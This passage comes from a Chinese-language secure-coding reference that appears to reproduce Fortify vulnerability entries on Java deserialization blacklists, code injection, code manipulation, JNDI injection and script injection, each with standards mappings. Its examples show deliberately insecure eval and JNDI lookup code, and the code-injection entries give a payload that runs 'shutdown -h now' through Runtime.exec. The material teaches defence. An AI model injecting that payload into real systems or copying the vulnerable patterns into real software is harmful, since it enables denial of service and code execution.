MAX_DATA) sb.append(data);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-267"><a href="#REFERENCES-267" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] DOS-1: Beware of activities that may use disproportionate resources Oracle</p>
<p>[2] MSC05-J. Do not exhaust heap space CERT</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 754</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Deserialization-Bad-Practice-Blacklist"><a href="#Deserialization-Bad-Practice-Blacklist" class="headerlink" title="Deserialization Bad Practice: Blacklist"></a>Deserialization Bad Practice: Blacklist</h4><h5 id="ABSTRACT-269"><a href="#ABSTRACT-269" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>基于防止对已知错误类（黑名单）进行反序列化而执行的防御反序列化可能会允许攻击者绕过这种防护且使其失效。</p>
<h5 id="EXPLANATION-270"><a href="#EXPLANATION-270" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>该应用程序实施了一种称为“前瞻反序列化”的防御性反序列化技术，使应用程序可以在实际反序列化类之前一窥其反序列化之后的结果。</p>
<p>新的小工具链、封装程序包或类可通过在其反序列化回调中执行嵌套反序列化来轻松绕过该黑名单。</p>
<h5 id="RECOMMENDATIONS-269"><a href="#RECOMMENDATIONS-269" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，在没有验证对象流的内容的情况下，请勿对不可信数据进行反序列化。为了验证要进行反序列化的类，应使用前瞻反序列化模式。</p>
<p>对象流首先将包含类描述元数据，然后包含其成员字段的序列化字节。Java 序列化过程允许开发人员读取类描述，并确定是继续进行对象的反序列化还是中止对象的反序列化。为此，需要在应执行类验证和确认的位置，子类化 java.io.ObjectInputStream 并提供 resolveClass(ObjectStreamClass desc) 方法的自定义实现。</p>
<p>已有易于使用的前瞻模式实现方式，例如 Apache Commons IO (org.apache.commons.io.serialization.ValidatingObjectInputStream)。始终使用严格的白名单方法，以仅允许对预期类型进行反序列化。不建议使用黑名单方法，因为攻击者可以使用许多可用小工具绕过黑名单。此外，请谨记，尽管用于执行代码的某些类已公开，但是还可能存在其他未知或未公开的类，因此，白名单方法始终都是首选方法。应审计白名单中允许的任何类，以确保对其进行反序列化是安全的。</p>
<p>在库或框架（例如，使用 JMX、RMI、JMS、HTTP Invoker 时）中执行反序列化时，上述建议并不适用，因为它超出了开发人员的控制范围。在这些情况下，您可能需要确保这些协议满足以下要求：</p>
<ul>
<li><p>未公开披露。</p>
</li>
<li><p>使用身份验证。</p>
</li>
<li><p>使用完整性检查。</p>
</li>
<li><p>使用加密。</p>
</li>
</ul>
<p>此外，每当应用程序通过 ObjectInputStream 执行反序列化时，Fortify Runtime（Fortify 运行时）都会提供要强制执行的安全控制，以此同时保护应用程序代码以及库和框架代码，防止遭到此类攻击。</p>
<h5 id="REFERENCES-268"><a href="#REFERENCES-268" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Fortify Software Security Research The perils of Java deserialization</p>
<p>[2] Fortify Application Defender</p>
<p>[3] Oracle Java Serialization</p>
<p>[4] IBM Look-ahead Java deserialization</p>
<p>[5] OWASP Deserialization of untrusted data</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 502</p>
<p>[7] Standards Mapping - FIPS200 SI</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[20] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Code-Injection"><a href="#Dynamic-Code-Evaluation-Code-Injection" class="headerlink" title="Dynamic Code Evaluation: Code Injection"></a>Dynamic Code Evaluation: Code Injection</h4><h5 id="ABSTRACT-270"><a href="#ABSTRACT-270" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时中解析用户控制的指令，会让攻击者有机会执行恶意代码。</p>
<h5 id="EXPLANATION-271"><a href="#EXPLANATION-271" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多现代编程语言都允许动态解析源代码指令。这使得程序员可以执行基于用户输入的动态指令。当程序员错误地认为由用户直接提供的指令仅会执行一些无害的操作时（如对当前的用户对象进行简单的计算或修改用户的状态），就会出现 code injection 漏洞：然而，若不经过适当的验证，用户指定的操作可能并不是程序员最初所期望的。</p>
<p>示例：在这个经典的 code injection 实例中，应用程序可以实施一个基本的计算器，该计算器允许用户指定执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	ScriptEngineManager scriptEngineManager = new ScriptEngineManager();</span><br><span class="line"></span><br><span class="line">	ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(&quot;js&quot;);</span><br><span class="line"></span><br><span class="line">	userOps = request.getParameter(&quot;operation&quot;);</span><br><span class="line"></span><br><span class="line">	Object result = scriptEngine.eval(userOps);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 operation 参数的值为良性值，程序就可以正常运行。例如，当该值为 “8 + 7 * 2” 时，result 变量被赋予的值将为 22。然而，如果攻击者指定的语言操作既有可能是有效的，又有可能是恶意的，那么，只有在对主进程具有完全权限的情况下才能执行这些操作。如果底层语言提供了访问系统资源的途径或允许执行系统命令，这种攻击甚至会更加危险。例如，JavaScript 允许调用 Java 对象；如果攻击者计划将<code>“ java.lang.Runtime.getRuntime().exec(“shutdown -h now”)”</code> 指定为 operation 的值，则主机系统就会执行关机命令。</p>
<h5 id="RECOMMENDATIONS-270"><a href="#RECOMMENDATIONS-270" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在任何时候，都应尽可能地避免解析动态代码。如果程序必须动态地解释代码，您可以通过以下方式将这种攻击获得成功的可能性降到最低：尽可能限制程序中动态执行的代码数量，将代码限制到基本编程语言的程序特定的和上下文特定的子集。程序绝对不能直接解析和执行未经验证的用户输入。而应采用间接方法：创建一份合法操作和数据对象列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接执行由用户提供的输入。</p>
<h5 id="REFERENCES-269"><a href="#REFERENCES-269" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INJECT-8: Take care interpreting untrusted code Oracle</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 95, CWE ID 494</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Code-Manipulation"><a href="#Dynamic-Code-Evaluation-Code-Manipulation" class="headerlink" title="Dynamic Code Evaluation: Code Manipulation"></a>Dynamic Code Evaluation: Code Manipulation</h4><h5 id="ABSTRACT-271"><a href="#ABSTRACT-271" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许未经验证的用户输入影响动态执行代码的运行时环境，会让攻击者有机会执行恶意代码。</p>
<h5 id="EXPLANATION-272"><a href="#EXPLANATION-272" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多现代编程语言都允许动态解析源代码指令。这使得程序员可以执行基于用户输入的动态操作。当程序员允许某些用户提供的数据改变动态执行代码的运行环境的某一方面时，就会发生 code manipulation 漏洞。若不经过适当的验证，用户指定的操作可能并不是程序员所最初期望的。</p>
<p>示例：在此示例中，应用程序从 Web 应用程序中检索脚本执行范围。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">   ScriptEngineManager scriptEngineManager = new ScriptEngineManager();</span><br><span class="line"></span><br><span class="line">   ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(&quot;js&quot;);</span><br><span class="line"></span><br><span class="line">   ScriptContext newContext = new SimpleScriptContext();</span><br><span class="line"></span><br><span class="line">   Bindings engineScope = newContext.getBindings(request.getParameter(&quot;userName&quot;));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   userOps = request.getParameter(&quot;operation&quot;);</span><br><span class="line"></span><br><span class="line">   Object result = scriptEngine.eval(userOps,newContext);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>当 page_scope 参数是期望的用户名时，程序将正常运行。但是，如果攻击者为 GLOBAL_SCOPE 指定值，则上述操作将访问同一 ScriptEngine 创建的所有引擎内的所有属性。</p>
<h5 id="RECOMMENDATIONS-271"><a href="#RECOMMENDATIONS-271" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在任何时候，都应尽可能地避免解析动态代码。如果程序必须动态地解释代码，您可以通过以下方式将这种攻击获得成功的可能性降到最低：尽可能限制程序中动态执行的代码数量，将代码限制到基本编程语言的程序特定的和上下文特定的子集。程序绝对不能直接解析和执行未经验证的用户输入。而应采用间接方法：创建一份合法操作和数据对象列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接执行由用户提供的输入。</p>
<h5 id="REFERENCES-270"><a href="#REFERENCES-270" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 494</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[13] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116, Risky Resource Management - CWE ID 094</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Process Validation (WASC-40), Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-JNDI-Reference-Injection"><a href="#Dynamic-Code-Evaluation-JNDI-Reference-Injection" class="headerlink" title="Dynamic Code Evaluation: JNDI Reference Injection"></a>Dynamic Code Evaluation: JNDI Reference Injection</h4><h5 id="ABSTRACT-272"><a href="#ABSTRACT-272" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序使用不可信赖的地址运行 JNDI 查找，这可能导致攻击者远程运行任意 Java 代码。</p>
<h5 id="EXPLANATION-273"><a href="#EXPLANATION-273" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果攻击者可以控制 JNDI 查找操作的地址，则他通过将该地址指向其控制的服务器的地址并将 JNDI 命名引用返回到具有自定义对象工厂的 RMI 存储对象，也许能够远程运行任意代码。</p>
<p>示例 1：以下示例中的代码使用不可信赖的数据运行 JNDI 查找。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String address = request.getParameter(&quot;address&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Properties props = new Properties();</span><br><span class="line"></span><br><span class="line">props.put(Provider_URL, &quot;rmi://secure-server:1099/&quot;);</span><br><span class="line"></span><br><span class="line">InitialContext ctx = new InitialContext(props);</span><br><span class="line"></span><br><span class="line">ctx.lookup(address);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-272"><a href="#RECOMMENDATIONS-272" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不应当允许未验证的用户输入来控制 JNDI 查找的地址。而应采用间接方法：创建一份合法地址列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接使用用户提供的输入来指定要查找的地址。</p>
<h5 id="REFERENCES-271"><a href="#REFERENCES-271" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Trend Micro How the pawn-storm zero day evaded Java’s click-to-play protection</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 502</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Script-Injection"><a href="#Dynamic-Code-Evaluation-Script-Injection" class="headerlink" title="Dynamic Code Evaluation: Script Injection"></a>Dynamic Code Evaluation: Script Injection</h4><h5 id="ABSTRACT-273"><a href="#ABSTRACT-273" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时中解析用户控制的指令，会让攻击者有机会执行恶意代码。</p>
<h5 id="EXPLANATION-274"><a href="#EXPLANATION-274" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多现代编程语言都允许动态解析源代码指令。这使得程序员可以执行基于用户输入的动态指令。当程序员错误地认为由用户直接提供的指令仅会执行一些无害的操作时（如对当前的用户对象进行简单的计算或修改用户的状态），就会出现 code injection 漏洞：然而，若不经过适当的验证，用户指定的操作可能并不是程序员最初所期望的。</p>
<p>示例：在这个经典的 code injection 实例中，应用程序可以实施一个基本的计算器，该计算器允许用户指定执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();</span><br><span class="line"></span><br><span class="line">        ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(&quot;js&quot;);</span><br><span class="line"></span><br><span class="line">        userOps = request.getParameter(&quot;operation&quot;);</span><br><span class="line"></span><br><span class="line">        Object result = scriptEngine.eval(userOps);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 operation 参数的值为良性值，程序就可以正常运行。例如，当该值为 “8 + 7 * 2” 时，result 变量被赋予的值将为 22。然而，如果攻击者指定的语言操作既有可能是有效的，又有可能是恶意的，那么，只有在对主进程具有完全权限的情况下才能执行这些操作。如果底层语言提供了访问系统资源的途径或允许执行系统命令，这种攻击甚至会更加危险。例如，JavaScript 允许调用 Java 对象；如果攻击者计划将 <code>“ java.lang.Runtime.getRuntime().exec(“shutdown -h now”)”</code> 指定为 operation 的值，则主机系统就会执行关机命令。</p>
<h5 id="RECOMMENDATIONS-273"><a href="#RECOMMENDATIONS-273" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在任何时候，都应尽可能地避免解析动态代码。如果程序必须动态地解释代码，您可以通过以下方式将这种攻击获得成功的可能性降到最低：尽可能限制程序中动态执行的代码数量，将代码限制到基本编程语言的程序特定的和上下文特定的子集。程序绝对不能直接解析和执行未经验证的用户输入。而应采用间接方法：创建一份合法操作和数据对象列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接执行由用户提供的输入。</p>
<h5 id="REFERENCES-272"><a href="#REFERENCES-272" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INJECT-8: Take care interpreting untrusted code Oracle</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 95, CWE ID 494</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A3 Malicious File Execution</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.3</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
